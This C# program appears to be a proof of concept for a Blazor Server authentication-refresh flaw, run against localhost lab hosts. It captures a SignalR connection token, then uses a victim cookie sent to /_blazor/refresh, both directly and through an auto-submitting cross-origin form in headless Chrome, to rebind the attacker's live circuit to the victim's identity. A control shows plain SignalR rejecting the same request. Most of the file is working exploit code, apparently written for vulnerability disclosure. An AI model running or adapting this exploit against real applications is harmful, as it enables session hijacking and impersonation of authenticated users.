using System.Buffers;
using System.Collections.Concurrent;
using System.Diagnostics;
using System.Diagnostics.CodeAnalysis;
using System.Net;
using System.Security.Claims;
using System.Text.Encodings.Web;
using System.Text.Json;
using Microsoft.AspNetCore.Authentication;
using Microsoft.AspNetCore.Authorization;
using Microsoft.AspNetCore.Components.Authorization;
using Microsoft.AspNetCore.Components.Server.Circuits;
using Microsoft.AspNetCore.Connections;
using Microsoft.AspNetCore.SignalR;
using Microsoft.AspNetCore.SignalR.Client;
using Microsoft.AspNetCore.SignalR.Protocol;
using Microsoft.Extensions.Options;

const string BaseUrl = "http://127.0.0.1:5088";
const string TargetBrowserUrl = "http://target.localtest.me:5088";
const string AttackerBrowserUrl = "http://attacker.localtest.me:5089";

var builder = WebApplication.CreateBuilder(args);
builder.WebHost.UseUrls("http://127.0.0.1:5088;http://127.0.0.1:5089");

builder.Services
    .AddAuthentication("Lab")
    .AddScheme<AuthenticationSchemeOptions, LabCookieAuthenticationHandler>("Lab", _ => { });
builder.Services.AddAuthorization();
builder.Logging.SetMinimumLevel(LogLevel.Debug);
builder.Logging.AddFilter("Microsoft.AspNetCore.Components.Server.Circuits", LogLevel.Debug);
builder.Logging.AddFilter("Microsoft.AspNetCore.Components.Server", LogLevel.Debug);
builder.Services
    .AddRazorComponents()
    .AddInteractiveServerComponents(options => options.DetailedErrors = true);
builder.Services.AddSingleton<ObservedCircuitIdentityStore>();
builder.Services.AddSingleton<BrowserCsrfObservation>();
builder.Services.AddScoped<CircuitHandler, IdentityObservingCircuitHandler>();

var app = builder.Build();
var browserObservation = app.Services.GetRequiredService<BrowserCsrfObservation>();

app.Use(async (context, next) =>
{
    var isBrowserRefresh =
        context.Request.Path.Equals("/_blazor/refresh", StringComparison.Ordinal)
        && string.Equals(context.Request.Host.Host, "target.localtest.me", StringComparison.OrdinalIgnoreCase);

    if (isBrowserRefresh)
    {
        browserObservation.RefreshOrigin = context.Request.Headers.Origin.ToString();
        browserObservation.RefreshSawVictimCookie =
            string.Equals(context.Request.Cookies["LabAuth"], "browser-victim", StringComparison.Ordinal);
    }

    await next();

    if (isBrowserRefresh)
    {
        browserObservation.RefreshStatusCode = context.Response.StatusCode;
    }
});

app.UseRouting();
app.UseAuthentication();
app.UseAuthorization();
app.MapBlazorHub();
app.MapHub<ControlHub>("/control", options => options.EnableAuthenticationRefresh = true);
app.MapGet("/health", () => Results.Text("OK")).AllowAnonymous();

app.MapGet("/browser-login", (HttpContext context) =>
{
    context.Response.Cookies.Append(
        "LabAuth",
        "browser-victim",
        new CookieOptions
        {
            HttpOnly = true,
            SameSite = SameSiteMode.Lax,
            Secure = false,
            Path = "/",
            MaxAge = TimeSpan.FromHours(1),
            Expires = DateTimeOffset.UtcNow.AddHours(1),
        });

    return Results.Content("<!doctype html><title>victim session established</title><p>victim session established</p>", "text/html");
}).AllowAnonymous();

app.MapGet("/attack", (HttpContext context) =>
{
    browserObservation.AttackPageSawVictimCookie =
        string.Equals(context.Request.Cookies["LabAuth"], "browser-victim", StringComparison.Ordinal);

    var token = context.Request.Query["token"].ToString();
    if (string.IsNullOrWhiteSpace(token))
    {
        return Results.BadRequest("missing token");
    }

    var action = TargetBrowserUrl + "/_blazor/refresh?id=" + Uri.EscapeDataString(token);
    var html = $"""
        <!doctype html>
        <html>
        <head><title>attacker origin</title></head>
        <body>
          <form id="attack" method="post" action="{HtmlEncoder.Default.Encode(action)}"></form>
          <script>document.getElementById('attack').submit();</script>
        </body>
        </html>
        """;

    return Results.Content(html, "text/html");
}).AllowAnonymous();

await app.StartAsync();

try
{
    var observed = app.Services.GetRequiredService<ObservedCircuitIdentityStore>();
    string? connectionToken = null;

    var attackerBuilder = new HubConnectionBuilder()
        .WithUrl(BaseUrl + "/_blazor", options =>
        {
            options.HttpMessageHandlerFactory = inner =>
                new NegotiateCaptureHandler(inner, token => connectionToken = token);
        });
    attackerBuilder.Services.AddSingleton<IHubProtocol>(new BlazorPackClientProtocol());

    await using var attackerConnection = attackerBuilder.Build();
    await attackerConnection.StartAsync();

    if (string.IsNullOrWhiteSpace(connectionToken))
    {
        throw new InvalidOperationException("Failed to capture the attacker's private SignalR connection token.");
    }

    Console.WriteLine($"ATTACKER_CONNECTION_TOKEN_CAPTURED={connectionToken.Length > 20}");
    Console.WriteLine($"ATTACKER_CONNECTION_STATE_BEFORE={attackerConnection.State}");

    var circuitSecret = await attackerConnection.InvokeAsync<string>(
        "StartCircuit",
        BaseUrl + "/",
        BaseUrl + "/",
        "[]",
        "");

    Console.WriteLine($"EMPTY_COMPONENT_CIRCUIT_STARTED={!string.IsNullOrEmpty(circuitSecret)}");

    // Empty-descriptor Blazor Web circuits intentionally defer CircuitHandler initialization
    // until the first UpdateRootComponents call. Exercise that real product path with an
    // empty operation batch so the observer is installed before authentication refresh.
    await attackerConnection.InvokeAsync(
        "UpdateRootComponents",
        "{ \"batchId\": 1, \"operations\": [] }",
        "");
    Console.WriteLine("EMPTY_ROOT_COMPONENT_UPDATE_COMPLETED=True");

    var initial = await observed.WaitForAnyAsync(TimeSpan.FromSeconds(10));
    Console.WriteLine($"INITIAL_CIRCUIT_USER={initial}");

    using var victimRefreshClient = new HttpClient(new HttpClientHandler
    {
        AllowAutoRedirect = false,
        UseCookies = false,
    });

    using var refresh = new HttpRequestMessage(
        HttpMethod.Post,
        BaseUrl + "/_blazor/refresh?id=" + Uri.EscapeDataString(connectionToken));
    refresh.Headers.TryAddWithoutValidation("Cookie", "LabAuth=victim");

    using var refreshResponse = await victimRefreshClient.SendAsync(refresh);
    var refreshBody = await refreshResponse.Content.ReadAsStringAsync();

    Console.WriteLine($"VICTIM_COOKIE_REFRESH_STATUS={(int)refreshResponse.StatusCode}");
    Console.WriteLine($"VICTIM_COOKIE_REFRESH_BODY={refreshBody}");

    var refreshed = await observed.WaitForUserAsync("victim", TimeSpan.FromSeconds(10));

    Console.WriteLine($"ATTACKER_CONNECTION_STATE_AFTER={attackerConnection.State}");
    Console.WriteLine($"CIRCUIT_REFRESHED_USER={refreshed}");
    Console.WriteLine($"OBSERVED_EVENTS={string.Join(",", observed.Events)}");

    if (refreshResponse.StatusCode != HttpStatusCode.OK)
    {
        throw new InvalidOperationException("Victim-cookie refresh request did not succeed.");
    }

    if (refreshed != "victim")
    {
        throw new InvalidOperationException("Attacker-owned circuit did not adopt victim principal.");
    }

    if (attackerConnection.State != HubConnectionState.Connected)
    {
        throw new InvalidOperationException("Attacker lost control of the SignalR connection.");
    }

    Console.WriteLine("ATTACKER_OWNED_BLAZOR_CIRCUIT_ADOPTED_VICTIM_PRINCIPAL=CONFIRMED");
    Console.WriteLine("ATTACKER_CONNECTION_REMAINS_CONNECTED_AFTER_REBIND=CONFIRMED");

    // Causal control: ordinary SignalR retains its default same-user refresh policy.
    // Use the same attacker-owned-token + victim-cookie pattern. It must reject the
    // anonymous -> victim transition instead of rebinding the live connection.
    string? controlConnectionToken = null;
    await using var controlConnection = new HubConnectionBuilder()
        .WithUrl(BaseUrl + "/control", options =>
        {
            options.HttpMessageHandlerFactory = inner =>
                new NegotiateCaptureHandler(inner, token => controlConnectionToken = token);
        })
        .Build();

    await controlConnection.StartAsync();
    if (string.IsNullOrWhiteSpace(controlConnectionToken))
    {
        throw new InvalidOperationException("Failed to capture normal SignalR control token.");
    }

    using var controlRefresh = new HttpRequestMessage(
        HttpMethod.Post,
        BaseUrl + "/control/refresh?id=" + Uri.EscapeDataString(controlConnectionToken));
    controlRefresh.Headers.TryAddWithoutValidation("Cookie", "LabAuth=victim");

    using var controlRefreshResponse = await victimRefreshClient.SendAsync(controlRefresh);
    var controlRefreshBody = await controlRefreshResponse.Content.ReadAsStringAsync();

    Console.WriteLine($"NORMAL_SIGNALR_CROSS_USER_REFRESH_STATUS={(int)controlRefreshResponse.StatusCode}");
    Console.WriteLine($"NORMAL_SIGNALR_CROSS_USER_REFRESH_BODY={controlRefreshBody}");
    Console.WriteLine($"NORMAL_SIGNALR_CONNECTION_STATE_AFTER={controlConnection.State}");

    if (controlRefreshResponse.StatusCode != HttpStatusCode.Forbidden)
    {
        throw new InvalidOperationException("Normal SignalR did not reject the cross-user refresh control.");
    }

    if (!controlRefreshBody.Contains("user_changed", StringComparison.Ordinal))
    {
        throw new InvalidOperationException("Normal SignalR control did not report user_changed.");
    }

    if (controlConnection.State != HubConnectionState.Connected)
    {
        throw new InvalidOperationException("Normal SignalR control connection unexpectedly disconnected.");
    }

    Console.WriteLine("NORMAL_SIGNALR_SAME_ATTACK_REJECTED_403=CONFIRMED");
    Console.WriteLine("BLAZOR_IDENTITY_OVERRIDE_IS_CAUSAL_DIFFERENCE=CONFIRMED");

    // Browser proof: establish a second attacker-owned Blazor circuit, then let a real
    // Chromium victim session perform a cross-origin but same-site HTML form POST.
    // The target cookie is host-only, HttpOnly, and SameSite=Lax. The attacker origin
    // must not receive it; the target refresh request should receive it automatically.
    var anonymousBeforeBrowserCircuit = observed.Count("anonymous");
    string? browserConnectionToken = null;

    var browserAttackerBuilder = new HubConnectionBuilder()
        .WithUrl(BaseUrl + "/_blazor", options =>
        {
            options.HttpMessageHandlerFactory = inner =>
                new NegotiateCaptureHandler(inner, token => browserConnectionToken = token);
        });
    browserAttackerBuilder.Services.AddSingleton<IHubProtocol>(new BlazorPackClientProtocol());

    await using var browserAttackerConnection = browserAttackerBuilder.Build();
    await browserAttackerConnection.StartAsync();

    if (string.IsNullOrWhiteSpace(browserConnectionToken))
    {
        throw new InvalidOperationException("Failed to capture browser-proof attacker connection token.");
    }

    var browserCircuitSecret = await browserAttackerConnection.InvokeAsync<string>(
        "StartCircuit",
        BaseUrl + "/",
        BaseUrl + "/",
        "[]",
        "");

    if (string.IsNullOrWhiteSpace(browserCircuitSecret))
    {
        throw new InvalidOperationException("Browser-proof attacker circuit failed to start.");
    }

    await browserAttackerConnection.InvokeAsync(
        "UpdateRootComponents",
        "{ \"batchId\": 2, \"operations\": [] }",
        "");

    await observed.WaitForCountAsync(
        "anonymous",
        anonymousBeforeBrowserCircuit + 1,
        TimeSpan.FromSeconds(10));

    Console.WriteLine("BROWSER_ATTACKER_CIRCUIT_STARTED_ANONYMOUS=CONFIRMED");

    var chrome = FindChromeExecutable();
    var profileDir = Path.Combine(Path.GetTempPath(), "blazor-refresh-victim-" + Guid.NewGuid().ToString("N"));
    Directory.CreateDirectory(profileDir);

    var loginRun = await RunChromeAsync(chrome, profileDir, TargetBrowserUrl + "/browser-login");
    Console.WriteLine($"BROWSER_LOGIN_EXIT_CODE={loginRun.ExitCode}");
    if (loginRun.ExitCode != 0)
    {
        Console.WriteLine(loginRun.StdErr);
        throw new InvalidOperationException("Headless browser could not establish the victim cookie.");
    }

    var attackUrl = AttackerBrowserUrl + "/attack?token=" + Uri.EscapeDataString(browserConnectionToken);
    var attackRun = await RunChromeAsync(chrome, profileDir, attackUrl);
    Console.WriteLine($"BROWSER_ATTACK_EXIT_CODE={attackRun.ExitCode}");
    Console.WriteLine($"BROWSER_ATTACK_FINAL_DOM_HAS_EMPTY_JSON={attackRun.StdOut.Contains("{}", StringComparison.Ordinal)}");

    if (attackRun.ExitCode != 0)
    {
        Console.WriteLine(attackRun.StdErr);
        throw new InvalidOperationException("Headless browser attack navigation failed.");
    }

    var browserRefreshed = await observed.WaitForUserAsync("browser-victim", TimeSpan.FromSeconds(10));

    Console.WriteLine($"ATTACK_PAGE_SAW_VICTIM_COOKIE={browserObservation.AttackPageSawVictimCookie}");
    Console.WriteLine($"BROWSER_REFRESH_ORIGIN={browserObservation.RefreshOrigin}");
    Console.WriteLine($"BROWSER_REFRESH_SAW_VICTIM_COOKIE={browserObservation.RefreshSawVictimCookie}");
    Console.WriteLine($"BROWSER_REFRESH_STATUS={browserObservation.RefreshStatusCode}");
    Console.WriteLine($"BROWSER_CIRCUIT_REFRESHED_USER={browserRefreshed}");
    Console.WriteLine($"BROWSER_ATTACKER_CONNECTION_STATE_AFTER={browserAttackerConnection.State}");

    if (browserObservation.AttackPageSawVictimCookie)
    {
        throw new InvalidOperationException("Target host-only victim cookie leaked to attacker origin.");
    }

    if (!browserObservation.RefreshSawVictimCookie)
    {
        throw new InvalidOperationException("SameSite=Lax victim cookie was not automatically sent to the target refresh POST.");
    }

    if (!string.Equals(browserObservation.RefreshOrigin, AttackerBrowserUrl, StringComparison.Ordinal))
    {
        throw new InvalidOperationException($"Unexpected refresh Origin: {browserObservation.RefreshOrigin}");
    }

    if (browserObservation.RefreshStatusCode != StatusCodes.Status200OK)
    {
        throw new InvalidOperationException($"Browser refresh returned {browserObservation.RefreshStatusCode}.");
    }

    if (browserRefreshed != "browser-victim")
    {
        throw new InvalidOperationException("Browser-driven refresh did not rebind attacker circuit to victim.");
    }

    if (browserAttackerConnection.State != HubConnectionState.Connected)
    {
        throw new InvalidOperationException("Browser-proof attacker lost control of their live SignalR connection.");
    }

    Console.WriteLine("DEFAULT_LAX_SAME_SITE_CROSS_ORIGIN_POST_SENT_VICTIM_COOKIE=CONFIRMED");
    Console.WriteLine("ATTACKER_ORIGIN_DID_NOT_RECEIVE_VICTIM_COOKIE=CONFIRMED");
    Console.WriteLine("BROWSER_DRIVEN_ATTACKER_CIRCUIT_ADOPTED_VICTIM_PRINCIPAL=CONFIRMED");
    Console.WriteLine("BROWSER_ATTACKER_CONNECTION_REMAINS_CONNECTED=CONFIRMED");
}
finally
{
    await app.StopAsync();
}

static string FindChromeExecutable()
{
    string[] candidates =
    [
        "/usr/bin/google-chrome",
        "/usr/bin/google-chrome-stable",
        "/usr/bin/chromium",
        "/usr/bin/chromium-browser",
    ];

    return candidates.FirstOrDefault(File.Exists)
        ?? throw new FileNotFoundException("No Chromium/Chrome executable found on the runner.");
}

static async Task<(int ExitCode, string StdOut, string StdErr)> RunChromeAsync(
    string executable,
    string profileDir,
    string url)
{
    using var process = new Process();
    process.StartInfo = new ProcessStartInfo
    {
        FileName = executable,
        UseShellExecute = false,
        RedirectStandardOutput = true,
        RedirectStandardError = true,
    };

    process.StartInfo.ArgumentList.Add("--headless=new");
    process.StartInfo.ArgumentList.Add("--no-sandbox");
    process.StartInfo.ArgumentList.Add("--disable-gpu");
    process.StartInfo.ArgumentList.Add("--disable-dev-shm-usage");
    process.StartInfo.ArgumentList.Add("--no-proxy-server");
    process.StartInfo.ArgumentList.Add("--host-resolver-rules=MAP target.localtest.me 127.0.0.1, MAP attacker.localtest.me 127.0.0.1");
    process.StartInfo.ArgumentList.Add("--user-data-dir=" + profileDir);
    process.StartInfo.ArgumentList.Add("--dump-dom");
    process.StartInfo.ArgumentList.Add(url);

    process.Start();
    var stdoutTask = process.StandardOutput.ReadToEndAsync();
    var stderrTask = process.StandardError.ReadToEndAsync();

    await process.WaitForExitAsync();
    return (process.ExitCode, await stdoutTask, await stderrTask);
}

sealed class BrowserCsrfObservation
{
    public bool AttackPageSawVictimCookie { get; set; }
    public string RefreshOrigin { get; set; } = string.Empty;
    public bool RefreshSawVictimCookie { get; set; }
    public int RefreshStatusCode { get; set; }
}

sealed class LabCookieAuthenticationHandler : AuthenticationHandler<AuthenticationSchemeOptions>
{
    public LabCookieAuthenticationHandler(
        IOptionsMonitor<AuthenticationSchemeOptions> options,
        ILoggerFactory logger,
        UrlEncoder encoder)
        : base(options, logger, encoder)
    {
    }

    protected override Task<AuthenticateResult> HandleAuthenticateAsync()
    {
        var cookie = Request.Headers.Cookie.ToString();
        var value = cookie.Split(';', StringSplitOptions.RemoveEmptyEntries | StringSplitOptions.TrimEntries)
            .FirstOrDefault(x => x.StartsWith("LabAuth=", StringComparison.Ordinal));

        if (value is null)
        {
            return Task.FromResult(AuthenticateResult.NoResult());
        }

        var user = value["LabAuth=".Length..];
        if (string.IsNullOrWhiteSpace(user))
        {
            return Task.FromResult(AuthenticateResult.NoResult());
        }

        var claims = new[]
        {
            new Claim(ClaimTypes.Name, user),
            new Claim(ClaimTypes.NameIdentifier, user),
            new Claim("sub", user),
        };
        var identity = new ClaimsIdentity(claims, Scheme.Name);
        return Task.FromResult(AuthenticateResult.Success(
            new AuthenticationTicket(new ClaimsPrincipal(identity), Scheme.Name)));
    }
}

sealed class ObservedCircuitIdentityStore
{
    private readonly ConcurrentQueue<string> _events = new();
    private readonly TaskCompletionSource<string> _first =
        new(TaskCreationOptions.RunContinuationsAsynchronously);
    private readonly ConcurrentDictionary<string, TaskCompletionSource<string>> _waiters = new();

    public IEnumerable<string> Events => _events;

    public void Record(ClaimsPrincipal principal)
    {
        var name = principal.Identity?.IsAuthenticated == true
            ? principal.Identity.Name ?? "(authenticated-no-name)"
            : "anonymous";

        _events.Enqueue(name);
        _first.TrySetResult(name);

        if (_waiters.TryGetValue(name, out var waiter))
        {
            waiter.TrySetResult(name);
        }
    }

    public Task<string> WaitForAnyAsync(TimeSpan timeout) => _first.Task.WaitAsync(timeout);

    public int Count(string user) => _events.Count(x => string.Equals(x, user, StringComparison.Ordinal));

    public async Task WaitForCountAsync(string user, int expectedCount, TimeSpan timeout)
    {
        using var cts = new CancellationTokenSource(timeout);
        while (Count(user) < expectedCount)
        {
            await Task.Delay(25, cts.Token);
        }
    }

    public Task<string> WaitForUserAsync(string user, TimeSpan timeout)
    {
        if (_events.Contains(user))
        {
            return Task.FromResult(user);
        }

        var waiter = _waiters.GetOrAdd(
            user,
            static _ => new TaskCompletionSource<string>(TaskCreationOptions.RunContinuationsAsynchronously));
        return waiter.Task.WaitAsync(timeout);
    }
}

sealed class IdentityObservingCircuitHandler : CircuitHandler
{
    private readonly AuthenticationStateProvider _authenticationStateProvider;
    private readonly ObservedCircuitIdentityStore _store;

    public IdentityObservingCircuitHandler(
        AuthenticationStateProvider authenticationStateProvider,
        ObservedCircuitIdentityStore store)
    {
        _authenticationStateProvider = authenticationStateProvider;
        _store = store;
        Console.WriteLine("CIRCUIT_HANDLER_CONSTRUCTED=True");
    }

    public override async Task OnCircuitOpenedAsync(Circuit circuit, CancellationToken cancellationToken)
    {
        Console.WriteLine("CIRCUIT_HANDLER_OPENED=True");
        var initial = await _authenticationStateProvider.GetAuthenticationStateAsync();
        _store.Record(initial.User);

        _authenticationStateProvider.AuthenticationStateChanged += task =>
        {
            Console.WriteLine("AUTH_STATE_CHANGED_EVENT=True");
            _ = ObserveAsync(task);
        };
    }

    private async Task ObserveAsync(Task<AuthenticationState> task)
    {
        var state = await task;
        Console.WriteLine($"AUTH_STATE_CHANGED_USER={state.User.Identity?.Name ?? "anonymous"}");
        _store.Record(state.User);
    }
}

sealed class NegotiateCaptureHandler : DelegatingHandler
{
    private readonly Action<string> _capture;

    public NegotiateCaptureHandler(HttpMessageHandler inner, Action<string> capture)
        : base(inner)
    {
        _capture = capture;
    }

    protected override async Task<HttpResponseMessage> SendAsync(
        HttpRequestMessage request,
        CancellationToken cancellationToken)
    {
        var response = await base.SendAsync(request, cancellationToken);

        if (request.RequestUri?.AbsolutePath.EndsWith("/negotiate", StringComparison.Ordinal) == true
            && response.Content is not null)
        {
            var bytes = await response.Content.ReadAsByteArrayAsync(cancellationToken);
            var originalHeaders = response.Content.Headers.ToDictionary(x => x.Key, x => x.Value.ToArray());

            using (var doc = JsonDocument.Parse(bytes))
            {
                if (doc.RootElement.TryGetProperty("connectionToken", out var token)
                    && token.GetString() is { Length: > 0 } value)
                {
                    _capture(value);
                }
            }

            var replacement = new ByteArrayContent(bytes);
            foreach (var header in originalHeaders)
            {
                replacement.Headers.TryAddWithoutValidation(header.Key, header.Value);
            }
            response.Content = replacement;
        }

        return response;
    }
}


sealed class BlazorPackClientProtocol : IHubProtocol
{
    private readonly MessagePackHubProtocol _inner = new();

    public string Name => "blazorpack";
    public int Version => 2;
    public TransferFormat TransferFormat => TransferFormat.Binary;

    public bool IsVersionSupported(int version) => version <= Version;

    public bool TryParseMessage(
        ref ReadOnlySequence<byte> input,
        IInvocationBinder binder,
        [NotNullWhen(true)] out HubMessage? message)
        => _inner.TryParseMessage(ref input, binder, out message);

    public void WriteMessage(HubMessage message, IBufferWriter<byte> output)
        => _inner.WriteMessage(message, output);

    public ReadOnlyMemory<byte> GetMessageBytes(HubMessage message)
        => _inner.GetMessageBytes(message);
}


sealed class ControlHub : Hub { }
